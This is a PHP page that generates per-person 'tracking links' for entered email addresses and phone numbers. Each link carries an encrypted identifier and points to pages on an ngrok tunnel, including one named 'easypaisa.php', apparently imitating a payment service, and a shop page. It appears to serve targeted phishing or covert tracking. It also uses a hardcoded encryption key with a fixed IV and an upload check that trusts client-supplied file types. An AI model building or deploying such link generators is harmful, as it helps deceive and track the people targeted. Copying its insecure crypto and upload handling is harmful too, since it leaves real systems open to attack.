<?php
// Function to encrypt data
function encryptData($data) {
    $key = 'secretkey';  // Change this to a secure key
    $iv = '1234567891011121'; // Initialization vector (16 bytes)
    return bin2hex(openssl_encrypt($data, 'AES-128-CTR', $key, 0, $iv));
}

// Initialize output variable to avoid undefined variable warning
$output = "";

// Handle file upload
$fileUploadMessage = "";

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['generate_link'])) {
    $emailLinks = [];
    $phoneLinks = [];
    
    // Handle file upload
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        // Set upload directory
        $uploadDir = 'uploads/';
        $uploadFile = $uploadDir . basename($_FILES['file']['name']);

        // Check file type and size (example: allow only image files and limit size to 5MB)
        $allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
        if (in_array($_FILES['file']['type'], $allowedTypes) && $_FILES['file']['size'] < 5000000) {
            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
                $fileUploadMessage = "File uploaded successfully.";
            } else {
                $fileUploadMessage = "Failed to upload file.";
            }
        } else {
            $fileUploadMessage = "Invalid file type or file is too large.";
        }
    }

    // Process email inputs
    if (!empty($_POST['emails'])) {
        foreach ($_POST['emails'] as $email) {
            if (!empty(trim($email))) { // Ignore empty fields
                $encrypted_email = encryptData("email:" . trim($email));
                $emailLinks[] = [
                    "data" => htmlspecialchars($email),
                    "links" => [
                        "https://78bf-103-137-24-41.ngrok-free.app/php_login_system/testing_website/easypaisa.php?data=" . urlencode($encrypted_email),
                        "https://78bf-103-137-24-41.ngrok-free.app/php_login_system/testing_website/tracking.php?data=" . urlencode($encrypted_email),
                        "https://78bf-103-137-24-41.ngrok-free.app/eshop2/?data=" . urlencode($encrypted_email)
                    ]
                ];
            }
        }
    }

    // Process phone inputs
    if (!empty($_POST['phones'])) {
        foreach ($_POST['phones'] as $phone) {
            if (!empty(trim($phone))) { // Ignore empty fields
                $encrypted_phone = encryptData("phone:" . trim($phone));
                $phoneLinks[] = [
                    "data" => htmlspecialchars($phone),
                    "links" => [
                        "https://78bf-103-137-24-41.ngrok-free.app/php_login_system/testing_website/easypaisa.php?data=" . urlencode($encrypted_phone),
                        "https://78bf-103-137-24-41.ngrok-free.app/php_login_system/testing_website/tracking.php?data=" . urlencode($encrypted_phone),
                        "https://78bf-103-137-24-41.ngrok-free.app/eshop2/?data=" . urlencode($encrypted_phone)
                    ]
                ];
            }
        }
    }

    // Prepare output to display tracking links
    if (empty($emailLinks) && empty($phoneLinks)) {
        $output = "Please enter at least one email or phone number.";
    } else {
        $output = "<ul>";
        if (!empty($emailLinks)) {
            foreach ($emailLinks as $link) {
                $output .= "<li>Email: " . $link['data'] . "</li><ul>";
                foreach ($link['links'] as $l) {
                    $output .= "<li><a href='" . $l . "' target='_blank'>" . $l . "</a></li>";
                }
                $output .= "</ul>";
            }
        }
        if (!empty($phoneLinks)) {
            foreach ($phoneLinks as $link) {
                $output .= "<li>Phone: " . $link['data'] . "</li><ul>";
                foreach ($link['links'] as $l) {
                    $output .= "<li><a href='" . $l . "' target='_blank'>" . $l . "</a></li>";
                }
                $output .= "</ul>";
            }
        }
        $output .= "</ul>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Generate Tracking Links</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7fa; color: #333; text-align: center; padding: 50px; margin: 0; }
        .container { max-width: 600px; margin: 0 auto; text-align: left; position: relative; }
        form { background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1); }
        .logo { position: fixed; top: 20px; width: 120px; height: auto; }
        .logo-left { left: 20px; }
        .logo-right { right: 20px; }
        h1 { color: #007bff; font-size: 30px; margin-bottom: 20px; text-align: center; }
        label { font-size: 16px; color: #333; margin-bottom: 5px; display: inline-block; }
        .input-container { position: relative; margin-bottom: 15px; }
        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; color: #333; box-sizing: border-box; }
        .add-btn { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: #28a745; color: #fff; border: none; border-radius: 50%; width: 30px; height: 30px; cursor: pointer; font-size: 18px; line-height: 30px; text-align: center; transition: background 0.3s; }
        .add-btn:hover { background: #218838; }
        input[type='submit'] { background: #007bff; color: #fff; border: none; cursor: pointer; padding: 15px; width: 100%; border-radius: 5px; font-size: 18px; transition: background 0.3s; }
        input[type='submit']:hover { background: #0056b3; }
        ul { text-align: left; padding-left: 20px; margin-top: 20px; color: #555; }
        ul li { margin-bottom: 10px; }

        /* WhatsApp logo style */
        .whatsapp-logo {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 60px;
            height: 60px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <img src="file.png" alt="Logo Left" class="logo logo-left">
    <img src="p2.png" alt="Logo Right" class="logo logo-right">

    <div class="container">
        <h1>Generate Tracking Links</h1>
        <form method="POST" id="linkForm" enctype="multipart/form-data">
            <div id="emailContainer">
                <label>Email:</label>
                <div class="input-container">
                    <input type="email" name="emails[]" value="">
                    <button type="button" class="add-btn" onclick="addField('emailContainer', 'emails[]')">+</button>
                </div>
            </div>

            <br>

            <div id="phoneContainer">
                <label>Phone Number:</label>
                <div class="input-container">
                    <input type="text" name="phones[]" value="">
                    <button type="button" class="add-btn" onclick="addField('phoneContainer', 'phones[]')">+</button>
                </div>
            </div>

            <br>

            <!-- File upload field -->
            <label>Upload File:</label>
            <div class="input-container">
                <input type="file" name="file" accept=".jpg,.jpeg,.png,.gif">
            </div>

            <br>

            <input type="submit" name="generate_link" value="Generate Links">
        </form>

        <?php 
            if (!empty($output)) {
                echo "<p>$output</p>";
            }

            // Display file upload message
            if (!empty($fileUploadMessage)) {
                echo "<p>$fileUploadMessage</p>";
            }
        ?>
    </div>

    <!-- WhatsApp Logo -->
    <a href="https://wa.me/11234567890" target="_blank">
        <img src="w3.png" alt="WhatsApp" class="whatsapp-logo">
    </a>

    <script>
        function addField(containerId, fieldName) {
            var container = document.getElementById(containerId);
            var div = document.createElement('div');
            div.className = 'input-container';
            div.innerHTML = '<input type="text" name="' + fieldName + '">';
            container.appendChild(div);
        }
    </script>
</body>
</html>
